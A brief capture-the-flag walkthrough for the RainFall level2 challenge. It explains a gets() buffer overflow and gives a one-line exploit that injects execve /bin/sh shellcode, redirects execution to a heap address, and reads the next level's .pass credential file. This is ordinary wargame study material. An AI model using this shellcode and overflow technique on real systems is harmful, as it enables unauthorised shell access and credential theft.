# Walkthrough

## 1. Disassembling the executable 

see source.c

## 2. Exploit

In this program, there is no call to a shell so we need to write our own payload and have the program jump to its address in order to execute it.
Conveniently, the variable b gets filled with a call to gets() (which should never be use) and then gets allocated into the heap.

We wrote a payload that write /bin/sh into our variable that will be duplicated into the heap and we jump in that location.

```
level2@RainFall:~$ (python -c "print('\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * (80 -24)  + '\x08\xa0\x04\x08')"; echo "cat /home/user/level3/.pass") | ./level2 
```
